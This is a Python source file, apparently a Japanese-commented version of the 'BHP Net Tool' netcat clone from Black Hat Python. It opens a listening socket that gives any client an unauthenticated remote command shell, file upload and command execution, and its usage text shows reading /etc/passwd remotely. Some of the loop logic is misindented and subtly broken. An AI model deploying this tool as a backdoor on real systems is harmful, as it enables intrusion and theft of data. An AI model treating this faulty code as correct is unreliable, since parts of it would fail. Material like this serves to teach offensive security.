# netcat.py
import argparse
import socket
import subprocess
import sys
from threading import Thread

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                 description='BHP Net Tool',
                                 epilog='''\
Examples:
    netcat.py -t 192.168.0.1 -p 5555 -l -c
    netcat.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe
    netcat.py -t 192.168.0.1 -p 5555 -l -e 'cat /etc/passwd'
    echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135''')

parser.add_argument(
    '-l', '--listen', help='listen on [host]:[port] for incoming connections', action='store_true')
parser.add_argument('-e', '--execute', default=None,
                    help='execute the given file upon receiving a connection')
parser.add_argument('-c', '--command',
                    help='initialize a command shell', action='store_true')
parser.add_argument(
    '-u', '--upload', help='upon receiving connection upload a file and write to [destination]')
parser.add_argument('-t', '--target', default=None)
parser.add_argument('-p', '--port', default=None, type=int)
args = parser.parse_args()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 標的ホストへ接続
        client.connect((args.target, args.port))
        if len(buffer):
            client.send(buffer)
        while True:
            recv_len = 1
            response = ""

            # 標的ホストからのデータを待機
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('utf-8')
                if recv_len < 4096:
                    break
                print(response.rstrip(), end="")

                # 追加の入力を待機
                buffer = input()
                if buffer == "":
                    continue
                if buffer == "exit":
                    client.send(b"exit")
                    break
                client.send(buffer.encode('utf-8'))
            client.close()
    except:
        print('[*] Exception! Exiting...')
        client.close()


def server_loop():
    # 待機するIPアドレスが指定されていない場合は
    # 全てのインターフェースで接続を待機
    if not args.target:
        args.target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((args.target, args.port))

    server.listen(5)
    while True:
        client_socket, addr = server.accept()

        # クライアントからの新しい接続を処理するスレッドの起動
        client_thread = Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    # クライアントから送られてきた改行文字を取り除く
    command = command.rstrip()
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True
        )
    except:
        output = b"Fail to execute command."
    return output


def client_handler(client_socket):
    """ オプション処理部分 """
    if args.upload:
        file_buffer = b""
    while True:
        data = client_socket.recv(1024)
        file_buffer += data
        if len(data) < 1024:
            break
        try:
            file_descriptor = open(args.upload, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully saved file to {}".format(
                args.upload).encode('utf-8'))
        except:
            client_socket.send("Failed to save file to {}".format(
                args.upload).encode('utf-8'))
    if args.execute:
        output = run_command(args.execute)
        client_socket.send(output)

    # プロンプトの表示
    if args.command:
        prompt = b"<BH:#> "
        client_socket.send(prompt)

        while True:
            # 改行文字を受け取るまでデータを受信
            recv_len = 1
            cmd_buffer = ""
            while recv_len:
                buffer = client_socket.recv(1024)
                recv_len = len(buffer)
                cmd_buffer += buffer.decode('utf-8')
                if recv_len < 1024:
                    break
            if cmd_buffer == "exit":
                client_socket.close()
                break

            # コマンドの実行結果を取得
            response = run_command(cmd_buffer)

            # コマンドの実行結果を送信
            client_socket.send(response + prompt)


def main():
    # クライアントモード および サーバモードで必要な引数（オプション）がなかった場合、helpを表示して終了
    if not args.listen and args.target and args.port:
        buffer = sys.stdin.read()
        client_sender(buffer.encode('utf-8'))
    elif args.listen:
        server_loop()
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
